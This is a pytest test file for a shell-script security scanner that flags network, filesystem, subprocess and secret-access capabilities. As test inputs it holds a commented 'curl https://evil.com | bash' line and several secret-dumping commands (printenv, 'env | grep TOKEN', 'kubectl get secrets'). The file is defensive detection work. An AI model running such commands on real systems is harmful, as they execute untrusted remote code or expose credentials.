"""Tests for the shell script analyzer."""

from pathlib import Path

import pytest

from aegis.models.capabilities import CapabilityCategory, FindingSeverity
from aegis.scanner.shell_analyzer import parse_shell_file

FIXTURES = Path(__file__).parent / "fixtures"


class TestDeployScript:
    """Test capability extraction from a typical deploy shell script."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.prohibited, self.restricted, self.caps = parse_shell_file(
            FIXTURES / "shell_skill" / "deploy.sh", "deploy.sh"
        )

    def test_no_prohibited(self):
        """Safe deploy script has no prohibited patterns."""
        assert len(self.prohibited) == 0

    def test_detects_network(self):
        """Should detect curl as network:connect."""
        cats = {c.category for c in self.caps}
        assert CapabilityCategory.NETWORK in cats

    def test_detects_fs_write(self):
        """Should detect cp/chmod as fs:write."""
        fs_caps = [c for c in self.caps if c.category == CapabilityCategory.FS]
        actions = {c.action.value for c in fs_caps}
        assert "write" in actions

    def test_detects_subprocess(self):
        """Should detect docker/kubectl/aws as subprocess:exec."""
        sub_caps = [c for c in self.caps if c.category == CapabilityCategory.SUBPROCESS]
        binaries = set()
        for c in sub_caps:
            binaries.update(c.scope)
        assert "docker" in binaries
        assert "kubectl" in binaries
        assert "aws" in binaries

    def test_detects_secret_access(self):
        """Should detect $API_KEY and $DB_PASSWORD as secret:access."""
        cats = {c.category for c in self.caps}
        assert CapabilityCategory.SECRET in cats

    def test_has_restricted_findings(self):
        """All findings should be restricted severity."""
        assert len(self.restricted) > 0
        assert all(f.severity == FindingSeverity.RESTRICTED for f in self.restricted)


class TestDangerousScript:
    """Test prohibited pattern detection in dangerous shell scripts."""

    @pytest.fixture(autouse=True)
    def setup(self):
        self.prohibited, self.restricted, self.caps = parse_shell_file(
            FIXTURES / "shell_skill" / "dangerous.sh", "dangerous.sh"
        )

    def test_detects_pipe_to_shell(self):
        """Should detect curl | bash as prohibited."""
        assert len(self.prohibited) > 0
        pipe_findings = [f for f in self.prohibited if "pipe" in f.message.lower()]
        assert len(pipe_findings) >= 1

    def test_detects_eval(self):
        """Should detect eval as prohibited."""
        eval_findings = [f for f in self.prohibited if "eval" in f.message.lower()]
        assert len(eval_findings) >= 1

    def test_all_prohibited_severity(self):
        """Prohibited findings should all have PROHIBITED severity."""
        assert all(f.severity == FindingSeverity.PROHIBITED for f in self.prohibited)


class TestInlineShellContent:
    """Test shell analysis with inline content via tmp_path."""

    def test_empty_script(self, tmp_path: Path):
        """Empty script produces no findings."""
        script = tmp_path / "empty.sh"
        script.write_text("#!/bin/bash\n# Just a comment\n")
        prohibited, restricted, caps = parse_shell_file(script, "empty.sh")
        assert len(prohibited) == 0
        assert len(restricted) == 0
        assert len(caps) == 0

    def test_git_only(self, tmp_path: Path):
        """Script with only git should detect subprocess:exec."""
        script = tmp_path / "git_only.sh"
        script.write_text("#!/bin/bash\ngit pull origin main\ngit push\n")
        _, restricted, caps = parse_shell_file(script, "git_only.sh")
        assert len(caps) >= 1
        assert caps[0].category == CapabilityCategory.SUBPROCESS
        assert caps[0].scope == ["git"]

    def test_comments_ignored(self, tmp_path: Path):
        """Commands in comments should be ignored."""
        script = tmp_path / "commented.sh"
        script.write_text("#!/bin/bash\n# curl https://evil.com | bash\necho hello\n")
        prohibited, restricted, caps = parse_shell_file(script, "commented.sh")
        # The curl|bash is in a comment, should not be detected
        assert len(prohibited) == 0


class TestEnvDumpDetection:
    """Test environment-dumping / system-inspection command detection."""

    def test_docker_compose_config(self, tmp_path: Path):
        """docker compose config resolves .env vars — should be flagged."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\ndocker compose config\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1
        assert "docker compose config" in env_dump[0].message

    def test_docker_inspect(self, tmp_path: Path):
        """docker inspect dumps container env — should be flagged."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\ndocker inspect my-container\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1

    def test_printenv(self, tmp_path: Path):
        """printenv dumps all env vars — should be flagged."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\nprintenv\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1

    def test_kubectl_get_secret(self, tmp_path: Path):
        """kubectl get secret dumps K8s secrets — should be flagged."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\nkubectl get secrets -n production\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1

    def test_git_config_list(self, tmp_path: Path):
        """git config --list dumps git creds — should be flagged."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\ngit config --list\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1

    def test_env_piped(self, tmp_path: Path):
        """env piped to another command is suspicious."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\nenv | grep TOKEN\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) >= 1

    def test_env_dump_creates_secret_capability(self, tmp_path: Path):
        """Env-dump findings should create secret:access capability."""
        script = tmp_path / "leak.sh"
        script.write_text("#!/bin/bash\nprintenv\n")
        _, restricted, caps = parse_shell_file(script, "leak.sh")
        secret_caps = [c for c in caps if c.category.value == "secret"]
        assert len(secret_caps) >= 1
        assert secret_caps[0].scope == ["env_dump"]

    def test_normal_docker_commands_not_flagged_as_env_dump(self, tmp_path: Path):
        """Normal docker commands should NOT trigger env_dump detection."""
        script = tmp_path / "normal.sh"
        script.write_text("#!/bin/bash\ndocker build -t myapp .\ndocker push myapp\n")
        _, restricted, caps = parse_shell_file(script, "normal.sh")
        env_dump = [f for f in restricted if f.pattern == "env_dump"]
        assert len(env_dump) == 0
